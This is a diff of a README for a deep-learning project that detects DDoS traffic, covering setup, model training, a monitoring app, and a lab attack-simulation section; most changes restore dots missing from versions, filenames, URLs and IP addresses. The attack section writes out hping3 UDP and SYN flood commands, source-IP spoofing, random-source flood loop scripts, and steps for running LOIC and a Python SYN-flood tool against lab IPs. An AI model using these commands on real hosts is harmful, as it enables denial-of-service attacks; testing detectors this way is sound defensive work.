@@ -4,11 +4,11 @@
 ## Overview
 
 ## Prerequisite
-- python 3110
-- NestJS 1102
-- Angular 1916
+- python 3.11.0
+- NestJS 11.0.2
+- Angular 19.1.6
 - Kafka
-- MonogoDB 234
+- MonogoDB 2.3.4
 - Visual Studio Code
 - ngrok-v3-stable
 
@@ -41,19 +41,19 @@
     On Windows
 
     ```
-    python -m venv venv
-    venv\Scripts\activate
-    pip install -r requirementstxt
-    pip install torch torchvision torchaudio --index-url https://downloadpytorchorg/whl/cu118
+    python -m venv .venv
+    .venv\Scripts\activate
+    pip install -r requirements.txt
+    pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
     ```
 
     On Ubuntu
 
     ```
-    python -m venv venv
-    source venv/bin/activate
-    pip install -r requirementstxt
-    pip install torch torchvision torchaudio --index-url https://downloadpytorchorg/whl/cu118
+    python -m venv .venv
+    source .venv/bin/activate
+    pip install -r requirements.txt
+    pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
     ```
 
 - Can you check available GPU
@@ -61,12 +61,12 @@
     ```
     import torch
 
-    print("Available? :", torchcudais_available())  # Must be True
-    print("Total GPU:", torchcudadevice_count())  # Must be greater than 0
-    print("GPU name:", torchcudaget_device_name(0) if torchcudais_available() else "No")
-    print("Cuda version in PyTorch:", torchversioncuda)
+    print("Available? :", torch.cuda.is_available())  # Must be True
+    print("Total GPU:", torch.cuda.device_count())  # Must be greater than 0
+    print("GPU name:", torch.cuda.get_device_name(0) if torch.cuda.is_available() else "No")
+    print("Cuda version in PyTorch:", torch.version.cuda)
 
-    device = torchdevice("cuda" if torchcudais_available() else "cpu")
+    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
     print(f"Using: {device}") # Using: cuda
     ```
 
@@ -74,26 +74,26 @@
 
 - I extracted 2 balanced data files:
 
-    - cicddos_2019csv (train_model/data/csv/cicddos_2019csv) with 8 labels, each label has 5000 data rows
+    - cicddos_2019.csv (train_model/data/csv/cicddos_2019.csv) with 8 labels, each label has 5000 data rows
 
-    - BoTNeTIoT-L01-v2csv (train_model/data/csv/BoTNeTIoT-L01-v2csv) with 2 labels, each label has 10000 data rows
+    - BoTNeTIoT-L01-v2.csv (train_model/data/csv/BoTNeTIoT-L01-v2.csv) with 2 labels, each label has 10000 data rows
 
-- Note: in this tutorial I will use cicddos_2019csv, if you use BoTNeTIoT-L01-v2csv you need to adjust the parameters when running the script
+- Note: in this tutorial I will use cicddos_2019.csv, if you use BoTNeTIoT-L01-v2.csv you need to adjust the parameters when running the script
 
 - Full Datasets 
 
 #### Convert 
 
-- Open 3_convert_df_to_imageipynb notebook and run all script
+- Open 3_convert_df_to_image.ipynb notebook and run all script
 
 - Images
 
 
 #### Train model
 
-- Using Resnet50: open 4_train_resnet50_modelipynb notebook and run all script
+- Using Resnet50: open 4_train_resnet50_model.ipynb notebook and run all script
 
-- You also use AlexNet: open 6_train_AlexNet_modelipynb notebook and run all script
+- You also use AlexNet: open 6_train_AlexNet_model.ipynb notebook and run all script
 
 ### Run monitoring app
 
@@ -103,7 +103,7 @@
 
 - Open monitoring-server (UI_monitor/monitoring-server) folder in VScode
 
-    - Open terminal and run script to install Dependencies
+    - Open terminal and run script to install dependencies
 
         ```
         npm i
@@ -131,7 +131,7 @@
 
 - Open monitoring-client (UI_monitor/monitoring-client) folder in VScode
 
-    - Open terminal and run script to install Dependencies
+    - Open terminal and run script to install dependencies
 
         ```
         npm i
@@ -156,17 +156,17 @@
 
 - Run the application on machine C (victim machine), using Ubuntu
 
-- Prepare model: I have prepared model resnet50_finetunedpth (network_traffic_monitoring/models/resnet50_finetunedpth)
+- Prepare model: I have prepared model resnet50_finetunedpth (network_traffic_monitoring/models/resnet50_finetuned.pth)
 
 - Open network_traffic_monitoring folder in VScode
 
 - Create virual environment
 
     ```
-    python -m venv venv
-    source venv/bin/activate
-    pip install -r requirementstxt
-    pip install torch torchvision torchaudio --index-url https://downloadpytorchorg/whl/cu118
+    python3 -m venv .venv
+    source .venv/bin/activate
+    pip install -r requirements.txt
+    pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
     ```
 
 - Change the API url is public URL of NestJS app
@@ -174,7 +174,7 @@
 - Run with Administrator
 
     ```
-    sudo $(which python3) mainpy
+    sudo $(which python3) main.py
     ```
 
 - Features:
@@ -195,15 +195,14 @@
 - Create virtual environment and install libraries
 
     ```
-    python -m venv venv
-    source venv/bin/activate
-    pip install -r requirementstxt
-    pip install torch torchvision torchaudio --index-url https://downloadpytorchorg/whl/cu118
+    python3 -m venv .venv
+    source .venv/bin/activate
+    pip install -r requirements.txt
     ```
 
 - Run SYN attack
     ```
-    sudo $(which python3) py3_SYN-Floodpy
+    sudo $(which python3) py3_SYN-Flood.py
     ```
 
 
@@ -216,14 +215,14 @@
     sudo apt install mono-complete
     ```
 
-- Download LOIC tool release from github: https://githubcom/NewEraCracker/LOIC?tab=readme-ov-file
+- Download LOIC tool release from github: https://github.com/NewEraCracker/LOIC?tab=readme-ov-file
 
 - Unzip the LOIC folder
 
 - Open the extracted LOIC folder in CMD
 
     ```
-    mono LOICexe
+    mono LOIC.exe
     ```
 
 - Configure on the interface and run the attack
@@ -246,7 +245,7 @@
 
     * UDP flood attack
         ```
-        sudo hping3 --flood --udp -p 80 --data 1200 172171293
+        sudo hping3 --flood --udp -p 80 --data 1200 172.171.2.93
         ```
         
         --flood : Send packets continuously without waiting for a response
@@ -256,7 +255,7 @@
 
         Ex:
         ```
-        sudo hping3 --flood --udp -p 80 --data 1200 19216820060
+        sudo hping3 --flood --udp -p 80 --data 1200 192.168.200.60
         ```
 
     * TCP SYN Flood attack
@@ -270,10 +269,10 @@
 
     * Create TCP packet with spoofed IP address:
         ```
-        sudo hping3 -a 1921681100 -S -p 80 <dest-IP>
+        sudo hping3 -a 192.168.1.100 -S -p 80 <dest-IP>
         ```
 
-        -a 1921681100 : Source IP address spoofing
+        -a 192.168.1.100 : Source IP address spoofing
         -S : Send SYN packet
         -p 80 : Target port
 
@@ -299,18 +298,18 @@
         -p 80 : Target port
 
     * UDP attack with random number of packets
-        - create udp_floodsh file with content:
+        - create udp_flood.sh file with content:
         
             ```
             #!/bin/bash
             
             # Ctrl + C to stop
-            trap "echo -e '\Stop!'; exit 0" SIGINT
+            trap "echo -e '\nStop!'; exit 0" SIGINT
 
             while true; do
                 SIZE=$((RANDOM % 1701 + 300)) 
                 #echo "Send UDP packet with $SIZE bytes"
-                sudo hping3 --udp -p 80 --data $SIZE 19216820060 --rand-source --fast
+                sudo hping3 --udp -p 80 --data $SIZE 192.168.200.60 --rand-source --fast
                 done
             ```
 
@@ -326,7 +325,7 @@
             
             # Ctrl + C to stop
             trap "echo -e '\nStop!'; exit 0" SIGINT
-            TARGET_IP="19216820060"
+            TARGET_IP="192.168.200.60"
             
             while true; do
                 SIZE=$((RANDOM % 1701 + 300)) 
@@ -337,33 +336,33 @@
 
         - Run in terminal
             ```
-            chmod +x udp_floodsh
-            sudo /udp_floodsh
+            chmod +x udp_flood.sh
+            sudo /udp_flood.sh
             ```
 
 
 ## References
 
 ### CICFlowMeter
-https://githubcom/YUANWRLD/CICFlowMeter
+https://github.com/YUANWRLD/CICFlowMeter
 
 ### Datasets
 
 CIC DDOS 2019 full dataset
-https://wwwkagglecom/datasets/rodrigorosasilva/cic-ddos2019-30gb-full-dataset-csv-files
+https://www.kaggle.com/datasets/rodrigorosasilva/cic-ddos2019-30gb-full-dataset-csv-files
 
 BoTNeTIoT-L01-v2
-https://wwwkagglecom/datasets/azalhowaide/iot-dataset-for-intrusion-detection-systems-ids?select=BoTNeTIoT-L01-v2csv
+https://www.kaggle.com/datasets/azalhowaide/iot-dataset-for-intrusion-detection-systems-ids?select=BoTNeTIoT-L01-v2csv
 
 ### Attack tools
 
 Python SYN Flood Attack Tool
-https://githubcom/EmreOvunc/Python-SYN-Flood-Attack-Tool
+https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool
 
 
 LOIC
-https://githubcom/NewEraCracker/LOIC?tab=readme-ov-file
+https://github.com/NewEraCracker/LOIC?tab=readme-ov-file
 
 
 Hping3 Library
-https://wwwkaliorg/tools/hping3/
+https://www.kali.org/tools/hping3/
